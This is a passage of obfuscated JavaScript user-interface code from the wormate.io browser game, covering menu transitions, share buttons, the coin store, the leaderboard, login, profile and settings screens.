              _0x245be1.attr("src", _0x503ed4.a.e);
              _0x2c8ad1.html("10");
              _0x58779d.width("0");
              _0x238d9c.html("");
              _0x4f80ef.html(1);
              _0x1c83b9.val(_0x1c97c7.Vf.fg(_0x1c97c7.Vf.ag));
            }
          });
          _0x2e0bde.On.zj(function () {
            _0x46d4a9.Nn.$l(_0x2e0bde.On.yj());
          });
        };
        _0x185c5d.prototype.Gk = function () {
          _0x1c97c7.kf.jn.stop();
          _0x1c97c7.kf.jn.fadeOut(50);
          _0x1c97c7.kf.ln.stop();
          _0x1c97c7.kf.ln.fadeOut(50);
          _0x1c97c7.kf.nn.stop();
          _0x1c97c7.kf.nn.fadeIn(500);
          _0x1c97c7.kf.pn.stop();
          _0x1c97c7.kf.pn.fadeOut(50);
          _0x1c97c7.kf.sn.stop();
          _0x1c97c7.kf.sn.fadeOut(50);
          _0x1c97c7.kf.qn.stop();
          _0x1c97c7.kf.qn.fadeOut(50);
          _0x1c97c7.kf.rn.stop();
          _0x1c97c7.kf.rn.fadeOut(50);
          _0x1c97c7.kf.tn.stop();
          _0x1c97c7.kf.tn.fadeOut(50);
          _0x1c97c7.kf.un_error.stop();
          _0x1c97c7.kf.un_error.fadeOut(50);
          _0x1c97c7.kf.mn.stop();
          _0x1c97c7.kf.mn.fadeIn(1);
          _0x1c97c7.kf.bgcanvas.stop();
          _0x1c97c7.kf.bgcanvas.fadeIn(500);
          _0x1c97c7.GameView.Kf(true);
          _0x1c97c7.kf.socialButtons.stop();
          _0x1c97c7.kf.socialButtons.fadeIn(500);
          _0x1c97c7.kf.vn.stop();
          _0x1c97c7.kf.vn.fadeIn(500);
        };
        _0x185c5d.prototype.Un = function () {
          _0x10ec1a.fadeIn(500);
          _0x50d9b4.fadeIn(500);
          _0x119e6e.fadeIn(500);
          _0xbdb9f0.fadeOut(100);
        };
        _0x185c5d.prototype.Vn = function () {
          _0x10ec1a.fadeOut(100);
          _0x50d9b4.fadeOut(100);
          _0x119e6e.fadeOut(100);
          _0xbdb9f0.fadeIn(500);
        };
        _0x185c5d.prototype.Ln = function (_0x109471, _0x3e5f97) {
          if (this.Jn !== _0x109471) {
            this.Jn = _0x109471;
          }
          var _0x35f9d8 = _0x503ed4.P(Math.floor(_0x3e5f97 * 100), 0, 100);
          if (this.In !== _0x35f9d8) {
            _0xd97fff.css({
              width: _0x35f9d8 + "%"
            });
            _0x559457.html(_0x35f9d8 + " %");
          }
        };
        _0x185c5d.prototype.Hk = function () {
          _0xf1d21a().Ci.Ce();
          this.Nn.Kf(true);
        };
        _0x185c5d.prototype.Bk = function () {
          this.Nn.Kf(false);
        };
        _0x185c5d.prototype.Jf = function () {
          this.Nn.Jf();
        };
        _0x185c5d.prototype.Nf = function (_0x31eb8b, _0x211235) {
          this.Nn.Nf();
        };
        _0x185c5d.prototype.el = function () {
          return _0x1c83b9.val();
        };
        _0x185c5d.prototype.Wn = function () {
          return _0x25b0db.val();
        };
        _0x185c5d.prototype.Qn = function () {};
        _0x185c5d.prototype.Rn = function () {
          function _0x13e3b5() {
            _0x48d621.Xn(true);
            setTimeout(function () {
              _0xdefc8b.hide();
            }, 3000);
          }
          var _0x48d621 = _0xf1d21a();
          if (_0x4e74ef.xn && !_0x48d621.Tn()) {
            _0xdefc8b.show();
            var _0x3ad4f6 = _0x503ed4.H("index.game.main.menu.unlockSkins.share");
            var _0x23ebe8 = encodeURIComponent(_0x503ed4.H("index.game.main.menu.unlockSkins.comeAndPlay") + " https://wormate.io/ #wormate #wormateio");
            var _0x5b263c = encodeURIComponent(_0x503ed4.H("index.game.main.menu.unlockSkins.comeAndPlay"));
            _0x18bf8c.append($("<a class=\"mm-skin-over-button\" id=\"mm-skin-over-tw\" target=\"_blank\" href=\"http://twitter.com/intent/tweet?status=" + _0x23ebe8 + "\"><img src=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZlcnNpb249IjEuMSIgd2lkdGg9IjQ1NiIgaGVpZ2h0PSI0NTYiIHhtbDpzcGFjZT0icHJlc2VydmUiPjxwYXRoIGQ9Ik02MCAzMzhjMzAgMTkgNjYgMzAgMTA1IDMwIDEwOCAwIDE5Ni04OCAxOTYtMTk2IDAtMyAwLTUgMC04IDQtMyAyOC0yMyAzNC0zNSAwIDAtMjAgOC0zOSAxMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAyLTEgMjctMTggMzAtMzggMCAwLTE0IDctMzMgMTQgLTMgMS03IDItMTAgMyAtMTMtMTMtMzAtMjItNTAtMjIgLTM4IDAtNjkgMzEtNjkgNjkgMCA1IDEgMTEgMiAxNiAtNSAwLTg2LTUtMTQxLTcxIDAgMC0zMyA0NSAyMCA5MSAwIDAtMTYtMS0zMC05IDAgMC01IDU0IDU0IDY4IDAgMC0xMiA0LTMwIDEgMCAwIDEwIDQ0IDYzIDQ4IDAgMC00MiAzOC0xMDEgMjlMNjAgMzM4eiIgZmlsbD0iI0ZGRiIvPjwvc3ZnPg==\"><span>" + _0x3ad4f6 + "</span></a>").click(_0x13e3b5));
            _0x18bf8c.append($("<a class=\"mm-skin-over-button\" id=\"mm-skin-over-fb\" target=\"_blank\" href=\"https://www.facebook.com/dialog/share?app_id=861926850619051&display=popup&href=https%3A%2F%2Fwormate.io&redirect_uri=https%3A%2F%2Fwormate.io&hashtag=%23wormateio&quote=" + _0x5b263c + "\"><img src=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZlcnNpb249IjEuMSIgeD0iMCIgeT0iMCIgdmlld0JveD0iMCAwIDQ1NiA0NTYiIHhtbDpzcGFjZT0icHJlc2VydmUiPjxwYXRoIGQ9Ik0yNDQuMyA0NTZWMjc5LjdoLTU5LjN2LTcxLjloNTkuM3YtNjAuNGMwLTQzLjkgMzUuNi03OS41IDc5LjUtNzkuNWg2MnY2NC42aC00NC40Yy0xMy45IDAtMjUuMyAxMS4zLTI1LjMgMjUuM3Y1MGg2OC41bC05LjUgNzEuOWgtNTkuMVY0NTZ6IiBmaWxsPSIjZmZmIi8+PC9zdmc+\"><span>" + _0x3ad4f6 + "</span></a>").click(_0x13e3b5));
          }
        };
        return _0x185c5d;
      }();
      _0x1c97c7.yk = function () {
        var _0x4e6811 = _0x503ed4.M(_0x1c97c7.kf, function () {
          _0x1c97c7.kf.call(this, _0x1c97c7.Fk.wn);
        });
        _0x4e6811.prototype.ha = function () {};
        _0x4e6811.prototype.Gk = function () {
          _0x1c97c7.kf.jn.stop();
          _0x1c97c7.kf.jn.fadeOut(50);
          _0x1c97c7.kf.ln.stop();
          _0x1c97c7.kf.ln.fadeOut(50);
          _0x1c97c7.kf.nn.stop();
          _0x1c97c7.kf.nn.fadeOut(50);
          _0x1c97c7.kf.pn.stop();
          _0x1c97c7.kf.pn.fadeOut(50);
          _0x1c97c7.kf.sn.stop();
          _0x1c97c7.kf.sn.fadeOut(50);
          _0x1c97c7.kf.qn.stop();
          _0x1c97c7.kf.qn.fadeOut(50);
          _0x1c97c7.kf.rn.stop();
          _0x1c97c7.kf.rn.fadeOut(50);
          _0x1c97c7.kf.tn.stop();
          _0x1c97c7.kf.tn.fadeOut(50);
          _0x1c97c7.kf.un_error.stop();
          _0x1c97c7.kf.un_error.fadeOut(50);
          _0x1c97c7.kf.mn.stop();
          _0x1c97c7.kf.mn.fadeOut(1);
          _0x1c97c7.kf.bgcanvas.stop();
          _0x1c97c7.kf.bgcanvas.fadeOut(50);
          _0x1c97c7.GameView.Kf(false);
          _0x1c97c7.kf.socialButtons.stop();
          _0x1c97c7.kf.socialButtons.fadeOut(50);
          _0x1c97c7.kf.vn.stop();
          _0x1c97c7.kf.vn.fadeOut(50);
        };
        return _0x4e6811;
      }();
      _0x1c97c7.pk = function () {
        var _0x394c4f = _0x503ed4.M(_0x1c97c7.kf, function () {
          _0x1c97c7.kf.call(this, _0x1c97c7.Fk.wn);
        });
        _0x394c4f.prototype.ha = function () {};
        _0x394c4f.prototype.Gk = function () {
          _0x1c97c7.kf.jn.stop();
          _0x1c97c7.kf.jn.fadeOut(50);
          _0x1c97c7.kf.ln.stop();
          _0x1c97c7.kf.ln.fadeOut(50);
          _0x1c97c7.kf.nn.stop();
          _0x1c97c7.kf.nn.fadeOut(50);
          _0x1c97c7.kf.pn.stop();
          _0x1c97c7.kf.pn.fadeOut(50);
          _0x1c97c7.kf.sn.stop();
          _0x1c97c7.kf.sn.fadeOut(50);
          _0x1c97c7.kf.qn.stop();
          _0x1c97c7.kf.qn.fadeOut(50);
          _0x1c97c7.kf.rn.stop();
          _0x1c97c7.kf.rn.fadeIn(500);
          _0x1c97c7.kf.tn.stop();
          _0x1c97c7.kf.tn.fadeOut(50);
          _0x1c97c7.kf.un_error.stop();
          _0x1c97c7.kf.un_error.fadeOut(50);
          _0x1c97c7.kf.mn.stop();
          _0x1c97c7.kf.mn.fadeIn(1);
          _0x1c97c7.kf.bgcanvas.stop();
          _0x1c97c7.kf.bgcanvas.fadeIn(500);
          _0x1c97c7.GameView.Kf(true);
          _0x1c97c7.kf.socialButtons.stop();
          _0x1c97c7.kf.socialButtons.fadeOut(50);
          _0x1c97c7.kf.vn.stop();
          _0x1c97c7.kf.vn.fadeOut(50);
        };
        _0x394c4f.prototype.Hk = function () {};
        return _0x394c4f;
      }();
      _0x1c97c7.rk = function () {
        var _0x3c7891 = $("#toaster-stack");
        var _0x2e7e09 = _0x503ed4.M(_0x1c97c7.kf, function () {
          _0x1c97c7.kf.call(this, _0x1c97c7.Fk.wn);
          this.Yn = [];
          this.Zn = null;
        });
        _0x2e7e09.prototype.ha = function () {};
        _0x2e7e09.prototype.Gk = function () {
          _0x1c97c7.kf.jn.stop();
          _0x1c97c7.kf.jn.fadeOut(50);
          _0x1c97c7.kf.ln.stop();
          _0x1c97c7.kf.ln.fadeOut(50);
          _0x1c97c7.kf.nn.stop();
          _0x1c97c7.kf.nn.fadeOut(50);
          _0x1c97c7.kf.pn.stop();
          _0x1c97c7.kf.pn.fadeOut(50);
          _0x1c97c7.kf.sn.stop();
          _0x1c97c7.kf.sn.fadeIn(500);
          _0x1c97c7.kf.qn.stop();
          _0x1c97c7.kf.qn.fadeOut(50);
          _0x1c97c7.kf.rn.stop();
          _0x1c97c7.kf.rn.fadeOut(50);
          _0x1c97c7.kf.tn.stop();
          _0x1c97c7.kf.tn.fadeOut(50);
          _0x1c97c7.kf.un_error.stop();
          _0x1c97c7.kf.un_error.fadeOut(50);
          _0x1c97c7.kf.mn.stop();
          _0x1c97c7.kf.mn.fadeIn(1);
          _0x1c97c7.kf.bgcanvas.stop();
          _0x1c97c7.kf.bgcanvas.fadeIn(500);
          _0x1c97c7.GameView.Kf(true);
          _0x1c97c7.kf.socialButtons.stop();
          _0x1c97c7.kf.socialButtons.fadeOut(50);
          _0x1c97c7.kf.vn.stop();
          _0x1c97c7.kf.vn.fadeIn(500);
        };
        _0x2e7e09.prototype.Hk = function () {
          this.$n();
        };
        _0x2e7e09.prototype.Kk = function () {
          return this.Zn != null || this.Yn.length > 0;
        };
        _0x2e7e09.prototype._n = function (_0x3799d1) {
          this.Yn.unshift(_0x3799d1);
          setTimeout(function () {
            _0xf1d21a().og.Ik();
          }, 0);
        };
        _0x2e7e09.prototype.El = function (_0x3d53ad) {
          this.Yn.push(_0x3d53ad);
          setTimeout(function () {
            _0xf1d21a().og.Ik();
          }, 0);
        };
        _0x2e7e09.prototype.$n = function () {
          var _0x7e4d07 = this;
          if (this.Zn == null) {
            if (this.Yn.length == 0) {
              _0xf1d21a().og.Dk();
              return;
            }
            var _0x2e68af = this.Yn.shift();
            this.Zn = _0x2e68af;
            var _0x292f98 = _0x2e68af.tf();
            _0x292f98.hide();
            _0x292f98.fadeIn(300);
            _0x3c7891.append(_0x292f98);
            _0x2e68af.ao = function () {
              _0x292f98.fadeOut(300);
              setTimeout(function () {
                _0x292f98.remove();
              }, 300);
              if (_0x7e4d07.Zn == _0x2e68af) {
                _0x7e4d07.Zn = null;
              }
              _0x7e4d07.$n();
            };
            _0x2e68af.Hk();
          }
        };
        return _0x2e7e09;
      }();
      _0x1c97c7.Fk = {
        wn: 0,
        Ek: 1
      };
      _0x1c97c7.bo = function () {
        var _0x1a7627 = $("#popup-menu-label");
        var _0x12a2e5 = $("#popup-menu-coins-box");
        var _0x3ce297 = $("#popup-menu-coins-val");
        $("#popup-menu-back").click(function () {
          var _0x4ef34a = _0xf1d21a();
          _0x4ef34a.Ci.Be();
          _0x4ef34a.og.Dk();
        });
        _0x12a2e5.click(function () {
          var _0x11fba6 = _0xf1d21a();
          if (_0x11fba6.Ij.Hj()) {
            _0x11fba6.Ci.Be();
            _0x11fba6.og.Ak(_0x11fba6.og._j);
          }
        });
        var _0x495149 = _0x503ed4.M(_0x1c97c7.kf, function (_0x43191d, _0x3d567d) {
          _0x1c97c7.kf.call(this, _0x1c97c7.Fk.Ek);
          this.ma = _0x43191d;
          this.co = _0x3d567d;
          this.do = [];
        });
        _0x495149.prototype.ha = function () {
          _0x495149.parent.prototype.ha.call(this);
          if (!_0x495149.eo) {
            _0x495149.eo = true;
            var _0xb53d25 = _0xf1d21a();
            _0xb53d25.Ij.zl(function () {
              if (_0xb53d25.Ij.Hj()) {
                _0x3ce297.html(_0xb53d25.Ij.il());
              } else {
                _0x3ce297.html("0");
              }
            });
          }
          _0x1c97c7.bo.fo.stop();
          _0x1c97c7.bo.fo.fadeOut(100);
        };
        _0x495149.go = $("#coins-view");
        _0x495149.ho = $("#leaders-view");
        _0x495149.io = $("#profile-view");
        _0x495149.jo = $("#settings-view");
        _0x495149.ko = $("#login-view");
        _0x495149.lo = $("#skins-view");
        _0x495149.mo = $("#store-view");
        _0x495149.no = $("#wear-view");
        _0x495149.oo = $("#withdraw-consent-view");
        _0x495149.po = $("#delete-account-view");
        _0x495149.fo = $("#please-wait-view");
        _0x495149.prototype.Gk = function () {
          _0x1c97c7.kf.jn.stop();
          _0x1c97c7.kf.jn.fadeOut(200);
          _0x1c97c7.kf.ln.stop();
          _0x1c97c7.kf.ln.fadeOut(200);
          _0x1c97c7.kf.nn.stop();
          _0x1c97c7.kf.nn.fadeOut(200);
          _0x1c97c7.kf.pn.stop();
          _0x1c97c7.kf.pn.fadeIn(200);
          _0x1c97c7.kf.sn.stop();
          _0x1c97c7.kf.sn.fadeOut(200);
          _0x1c97c7.kf.qn.stop();
          _0x1c97c7.kf.qn.fadeOut(200);
          _0x1c97c7.kf.rn.stop();
          _0x1c97c7.kf.rn.fadeOut(200);
          _0x1c97c7.kf.tn.stop();
          _0x1c97c7.kf.tn.fadeOut(200);
          _0x1c97c7.kf.un_error.stop();
          _0x1c97c7.kf.un_error.fadeOut(200);
          _0x1c97c7.kf.mn.stop();
          _0x1c97c7.kf.mn.fadeIn(1);
          _0x1c97c7.kf.bgcanvas.stop();
          _0x1c97c7.kf.bgcanvas.fadeIn(500);
          _0x1c97c7.GameView.Kf(true);
          _0x1c97c7.kf.socialButtons.stop();
          _0x1c97c7.kf.socialButtons.fadeIn(200);
          _0x1c97c7.kf.vn.stop();
          _0x1c97c7.kf.vn.fadeIn(200);
          _0x1a7627.html(this.ma);
          _0x12a2e5.toggle(this.co);
          this.qo();
        };
        _0x495149.prototype.qo = function () {};
        _0x495149.prototype.ro = function (_0x38532c) {
          var _0x4675fb = this;
          var _0x53bf0c = _0x503ed4.V(0, 2147483647) & 2147483647;
          this.do.push(_0x53bf0c);
          _0x1c97c7.bo.fo.stop();
          _0x1c97c7.bo.fo.fadeIn(100);
          setTimeout(function () {
            _0x4675fb.so(_0x53bf0c);
          }, _0x38532c);
          return new _0x1a11ea(this, _0x53bf0c);
        };
        _0x495149.prototype.so = function (_0x407621) {
          var _0x45cb23 = this.do.indexOf(_0x407621);
          if (!(_0x45cb23 < 0)) {
            this.do.splice(_0x45cb23, 1);
            if (this.do.length === 0) {
              _0x1c97c7.bo.fo.stop();
              _0x1c97c7.bo.fo.fadeOut(100);
            }
          }
        };
        return _0x495149;
      }();
      var _0x1a11ea = function () {
        function _0x5ce97d(_0x241c5b, _0x52783e) {
          this.to = _0x241c5b;
          this.uo = _0x52783e;
        }
        _0x5ce97d.prototype.vo = function () {
          this.to.so(this.uo);
        };
        return _0x5ce97d;
      }();
      _0x1c97c7.ak = function () {
        var _0x49782f = $("#store-buy-coins_125000");
        var _0x917e19 = $("#store-buy-coins_50000");
        var _0x1e70a7 = $("#store-buy-coins_16000");
        var _0x276f8d = $("#store-buy-coins_7000");
        var _0x2b92a4 = $("#store-buy-coins_3250");
        var _0x579178 = $("#store-buy-coins_1250");
        var _0x1c701c = _0x503ed4.M(_0x1c97c7.bo, function () {
          _0x1c97c7.bo.call(this, _0x503ed4.H("index.game.popup.menu.coins.tab"), false);
          var _0x18969e = _0xf1d21a();
          var _0x2779fa = this;
          _0x49782f.click(function () {
            _0x18969e.Ci.Be();
            _0x2779fa.wo("coins_125000");
          });
          _0x917e19.click(function () {
            _0x18969e.Ci.Be();
            _0x2779fa.wo("coins_50000");
          });
          _0x1e70a7.click(function () {
            _0x18969e.Ci.Be();
            _0x2779fa.wo("coins_16000");
          });
          _0x276f8d.click(function () {
            _0x18969e.Ci.Be();
            _0x2779fa.wo("coins_7000");
          });
          _0x2b92a4.click(function () {
            _0x18969e.Ci.Be();
            _0x2779fa.wo("coins_3250");
          });
          _0x579178.click(function () {
            _0x18969e.Ci.Be();
            _0x2779fa.wo("coins_1250");
          });
        });
        _0x1c701c.prototype.ha = function () {
          _0x1c701c.parent.prototype.ha.call(this);
        };
        _0x1c701c.prototype.qo = function () {
          _0x1c97c7.bo.go.stop();
          _0x1c97c7.bo.go.fadeIn(200);
          _0x1c97c7.bo.ho.stop();
          _0x1c97c7.bo.ho.fadeOut(50);
          _0x1c97c7.bo.io.stop();
          _0x1c97c7.bo.io.fadeOut(50);
          _0x1c97c7.bo.ko.stop();
          _0x1c97c7.bo.ko.fadeOut(50);
          _0x1c97c7.bo.jo.stop();
          _0x1c97c7.bo.jo.fadeOut(50);
          _0x1c97c7.bo.lo.stop();
          _0x1c97c7.bo.lo.fadeOut(50);
          _0x1c97c7.bo.mo.stop();
          _0x1c97c7.bo.mo.fadeOut(50);
          _0x1c97c7.bo.no.stop();
          _0x1c97c7.bo.no.fadeOut(50);
          _0x1c97c7.bo.oo.stop();
          _0x1c97c7.bo.oo.fadeOut(50);
          _0x1c97c7.bo.po.stop();
          _0x1c97c7.bo.po.fadeOut(50);
        };
        _0x1c701c.prototype.Hk = function () {
          _0xf1d21a().Ci.Ce();
        };
        _0x1c701c.prototype.wo = function (_0x5aeae9) {};
        return _0x1c701c;
      }();
      _0x1c97c7.ck = function () {
        var _0x134bd8 = $("#highscore-table");
        var _0x44086c = $("#leaders-button-level");
        var _0x307f15 = $("#leaders-button-highscore");
        var _0x1bfe36 = $("#leaders-button-kills");
        var _0x4cc81a = _0x503ed4.M(_0x1c97c7.bo, function () {
          _0x1c97c7.bo.call(this, _0x503ed4.H("index.game.popup.menu.leaders.tab"), true);
          var _0x253686 = _0xf1d21a();
          var _0x55428b = this;
          this.xo = {};
          this.yo = {
            zo: {
              Ao: _0x44086c,
              Bo: "byLevel"
            },
            Co: {
              Ao: _0x307f15,
              Bo: "byHighScore"
            },
            Do: {
              Ao: _0x1bfe36,
              Bo: "byKillsAndHeadShots"
            }
          };
          _0x44086c.click(function () {
            _0x253686.Ci.Be();
            _0x55428b.Eo(_0x55428b.yo.zo);
          });
          _0x307f15.click(function () {
            _0x253686.Ci.Be();
            _0x55428b.Eo(_0x55428b.yo.Co);
          });
          _0x1bfe36.click(function () {
            _0x253686.Ci.Be();
            _0x55428b.Eo(_0x55428b.yo.Do);
          });
        });
        _0x4cc81a.prototype.ha = function () {
          _0x4cc81a.parent.prototype.ha.call(this);
        };
        _0x4cc81a.prototype.qo = function () {
          _0x1c97c7.bo.go.stop();
          _0x1c97c7.bo.go.fadeOut(50);
          _0x1c97c7.bo.ho.stop();
          _0x1c97c7.bo.ho.fadeIn(200);
          _0x1c97c7.bo.io.stop();
          _0x1c97c7.bo.io.fadeOut(50);
          _0x1c97c7.bo.ko.stop();
          _0x1c97c7.bo.ko.fadeOut(50);
          _0x1c97c7.bo.jo.stop();
          _0x1c97c7.bo.jo.fadeOut(50);
          _0x1c97c7.bo.lo.stop();
          _0x1c97c7.bo.lo.fadeOut(50);
          _0x1c97c7.bo.mo.stop();
          _0x1c97c7.bo.mo.fadeOut(50);
          _0x1c97c7.bo.no.stop();
          _0x1c97c7.bo.no.fadeOut(50);
          _0x1c97c7.bo.oo.stop();
          _0x1c97c7.bo.oo.fadeOut(50);
          _0x1c97c7.bo.po.stop();
          _0x1c97c7.bo.po.fadeOut(50);
        };
        _0x4cc81a.prototype.Hk = function () {
          var _0x30bf91 = this;
          _0xf1d21a().Ci.Ce();
          var _0x2f637b = this.ro(5000);
          var _0x608933 = _0x503ed4.a.b + "/pub/leaders";
          _0x503ed4.Z(_0x608933, function () {
            _0x30bf91.xo = {
              byLevel: [],
              byHighScore: [],
              byKillsAndHeadShots: []
            };
            _0x30bf91.Eo(_0x30bf91.Fo ?? _0x30bf91.yo.zo);
            _0x2f637b.vo();
          }, function (_0x4b97e2) {
            _0x30bf91.xo = _0x4b97e2;
            _0x30bf91.Eo(_0x30bf91.Fo ?? _0x30bf91.yo.zo);
            _0x2f637b.vo();
          });
        };
        _0x4cc81a.prototype.Eo = function (_0x3038e5) {
          this.Fo = _0x3038e5;
          for (var _0x59112b in this.yo) {
            if (this.yo.hasOwnProperty(_0x59112b)) {
              var _0x32ac31 = this.yo[_0x59112b];
              _0x32ac31.Ao.removeClass("pressed");
            }
          }
          this.Fo.Ao.addClass("pressed");
          for (var _0x496c84 = this.xo[this.Fo.Bo], _0x8ffcfd = "", _0x36bc85 = 0; _0x36bc85 < _0x496c84.length; _0x36bc85++) {
            var _0x2c1109 = _0x496c84[_0x36bc85];
            _0x8ffcfd += "<div class=\"table-row\"><span>" + (_0x36bc85 + 1) + "</span><span><img src=\"" + _0x2c1109.avatarUrl + "\"/></span><span>" + _0x2c1109.username + "</span><span>" + _0x2c1109.level + "</span><span>" + _0x2c1109.highScore + "</span><span>" + _0x2c1109.headShots + " / " + _0x2c1109.kills + "</span></div>";
          }
          _0x134bd8.empty();
          _0x134bd8.append(_0x8ffcfd);
        };
        return _0x4cc81a;
      }();
      _0x1c97c7.gk = function () {
        var _0x5723e9 = $("#popup-login-gg");
        var _0xb961e2 = $("#popup-login-fb");
        var _0x5c64ee = _0x503ed4.M(_0x1c97c7.bo, function () {
          var _0x25dccd = this;
          _0x1c97c7.bo.call(this, _0x503ed4.H("index.game.popup.menu.login.tab"), false);
          var _0x21b61f = _0xf1d21a();
          _0x5723e9.click(function () {
            _0x21b61f.Ci.Be();
            var _0xf8eaad = _0x25dccd.ro(10000);
            setTimeout(function () {
              _0x21b61f.Ij.Ml(function () {
                if (_0x21b61f.Ij.Hj()) {
                  _0x21b61f.Ci.Fe();
                }
                _0xf8eaad.vo();
              });
            }, 500);
          });
          _0xb961e2.click(function () {
            _0x21b61f.Ci.Be();
            var _0x8ae28d = _0x25dccd.ro(10000);
            setTimeout(function () {
              _0x21b61f.Ij.Jl(function () {
                if (_0x21b61f.Ij.Hj()) {
                  _0x21b61f.Ci.Fe();
                }
                _0x8ae28d.vo();
              });
            }, 500);
          });
        });
        _0x5c64ee.prototype.ha = function () {
          _0x5c64ee.parent.prototype.ha.call(this);
        };
        _0x5c64ee.prototype.qo = function () {
          _0x1c97c7.bo.go.stop();
          _0x1c97c7.bo.go.fadeOut(50);
          _0x1c97c7.bo.ho.stop();
          _0x1c97c7.bo.ho.fadeOut(50);
          _0x1c97c7.bo.io.stop();
          _0x1c97c7.bo.io.fadeOut(50);
          _0x1c97c7.bo.ko.stop();
          _0x1c97c7.bo.ko.fadeIn(200);
          _0x1c97c7.bo.jo.stop();
          _0x1c97c7.bo.jo.fadeOut(50);
          _0x1c97c7.bo.lo.stop();
          _0x1c97c7.bo.lo.fadeOut(50);
          _0x1c97c7.bo.mo.stop();
          _0x1c97c7.bo.mo.fadeOut(50);
          _0x1c97c7.bo.no.stop();
          _0x1c97c7.bo.no.fadeOut(50);
          _0x1c97c7.bo.oo.stop();
          _0x1c97c7.bo.oo.fadeOut(50);
          _0x1c97c7.bo.po.stop();
          _0x1c97c7.bo.po.fadeOut(50);
        };
        _0x5c64ee.prototype.Hk = function () {
          _0xf1d21a().Ci.Ce();
        };
        return _0x5c64ee;
      }();
      _0x1c97c7.ek = function () {
        var _0x1c62b1 = $("#profile-avatar");
        var _0x453d9c = $("#profile-username");
        var _0x4aa11b = $("#profile-experience-bar");
        var _0x124671 = $("#profile-experience-val");
        var _0x4ee209 = $("#profile-level");
        var _0x2f6ba0 = $("#profile-stat-highScore");
        var _0x57d00c = $("#profile-stat-bestSurvivalTime");
        var _0x3e00dc = $("#profile-stat-kills");
        var _0x8b76c5 = $("#profile-stat-headshots");
        var _0x5b70d5 = $("#profile-stat-gamesPlayed");
        var _0x254f37 = $("#profile-stat-totalTimeSpent");
        var _0xdbf4 = $("#profile-stat-registrationDate");
        var _0x1c2b26 = _0x503ed4.M(_0x1c97c7.bo, function () {
          _0x1c97c7.bo.call(this, _0x503ed4.H("index.game.popup.menu.profile.tab"), true);
        });
        _0x1c2b26.prototype.ha = function () {
          _0x1c2b26.parent.prototype.ha.call(this);
        };
        _0x1c2b26.prototype.qo = function () {
          _0x1c97c7.bo.go.stop();
          _0x1c97c7.bo.go.fadeOut(50);
          _0x1c97c7.bo.ho.stop();
          _0x1c97c7.bo.ho.fadeOut(50);
          _0x1c97c7.bo.io.stop();
          _0x1c97c7.bo.io.fadeIn(200);
          _0x1c97c7.bo.ko.stop();
          _0x1c97c7.bo.ko.fadeOut(50);
          _0x1c97c7.bo.jo.stop();
          _0x1c97c7.bo.jo.fadeOut(50);
          _0x1c97c7.bo.lo.stop();
          _0x1c97c7.bo.lo.fadeOut(50);
          _0x1c97c7.bo.mo.stop();
          _0x1c97c7.bo.mo.fadeOut(50);
          _0x1c97c7.bo.no.stop();
          _0x1c97c7.bo.no.fadeOut(50);
          _0x1c97c7.bo.oo.stop();
          _0x1c97c7.bo.oo.fadeOut(50);
          _0x1c97c7.bo.po.stop();
          _0x1c97c7.bo.po.fadeOut(50);
        };
        _0x1c2b26.prototype.Hk = function () {
          var _0x10d696 = _0xf1d21a();
          _0x10d696.Ci.Ce();
          var _0x563fbb = _0x10d696.Ij.xl();
          var _0xd1e0a2 = moment([_0x563fbb.year, _0x563fbb.month - 1, _0x563fbb.day]).format("LL");
          _0x453d9c.html(_0x10d696.Ij.dl());
          _0x1c62b1.attr("src", _0x10d696.Ij.fl());
          _0x4aa11b.width(_0x10d696.Ij.kl() * 100 / _0x10d696.Ij.ll() + "%");
          _0x124671.html(_0x10d696.Ij.kl() + " / " + _0x10d696.Ij.ll());
          _0x4ee209.html(_0x10d696.Ij.jl());
          _0x2f6ba0.html(_0x10d696.Ij.rl());
          _0x57d00c.html(_0x503ed4.J(_0x10d696.Ij.sl()));
          _0x3e00dc.html(_0x10d696.Ij.tl());
          _0x8b76c5.html(_0x10d696.Ij.ul());
          _0x5b70d5.html(_0x10d696.Ij.vl());
          _0x254f37.html(_0x503ed4.J(_0x10d696.Ij.wl()));
          _0xdbf4.html(_0xd1e0a2);
        };
        return _0x1c2b26;
      }();
      _0x1c97c7.hk = function () {
        var _0x5110b3 = $("#settings-music-enabled-switch");
        var _0x420527 = $("#settings-sfx-enabled-switch");
        var _0x5db308 = $("#settings-show-names-switch");
        var _0x36c614 = $("#popup-logout");
        var _0x33c70f = $("#popup-logout-container");
        var _0x43109a = $("#popup-delete-account");
        var _0x5c4b4a = $("#popup-delete-account-container");
        var _0x221aa2 = $("#popup-withdraw-consent");
        var _0x5da98a = _0x503ed4.M(_0x1c97c7.bo, function () {
          _0x1c97c7.bo.call(this, _0x503ed4.H("index.game.popup.menu.settings.tab"), false);
          var _0x2fe0ff = this;
          var _0xb5152c = _0xf1d21a();
          _0x5110b3.click(function () {
            var _0x53402f = !!_0x5110b3.prop("checked");
            _0x1c97c7.Vf.eg(_0x1c97c7.Vf.Yf, _0x53402f, 30);
            _0xb5152c.Ci.re(_0x53402f);
            _0xb5152c.Ci.Be();
          });
          _0x420527.click(function () {
            var _0x375780 = !!_0x420527.prop("checked");
            _0x1c97c7.Vf.eg(_0x1c97c7.Vf.Zf, _0x375780, 30);
            _0xb5152c.Ci.oe(_0x375780);
            _0xb5152c.Ci.Be();
          });
          _0x5db308.click(function () {
            _0xb5152c.Ci.Be();
          });
          _0x36c614.click(function () {
            _0xb5152c.Ci.Be();
            _0x2fe0ff.ro(500);
            _0xb5152c.Ij.Kl();
          });
          _0x43109a.click(function () {
            if (_0xb5152c.Ij.Hj()) {
              _0xb5152c.Ci.Be();
              _0xb5152c.og.Ak(_0xb5152c.og.Zj);
            } else {
              _0xb5152c.Ci.Ge();
            }
          });
          _0x221aa2.click(function () {
            if (_0xb5152c.Go()) {
              _0xb5152c.Ci.Be();
              _0xb5152c.og.Ak(_0xb5152c.og.Xj);
            } else {
              _0xb5152c.Ci.Ge();
            }
          });
        });
        _0x5da98a.prototype.ha = function () {
          _0x5da98a.parent.prototype.ha.call(this);
          var _0x34b106 = _0xf1d21a();
          var _0x3adf16 = undefined;
          switch (_0x1c97c7.Vf.fg(_0x1c97c7.Vf.Yf)) {
            case "false":
              _0x3adf16 = false;
              break;
            default:
              _0x3adf16 = true;
          }
          _0x5110b3.prop("checked", _0x3adf16);
          _0x34b106.Ci.re(_0x3adf16);
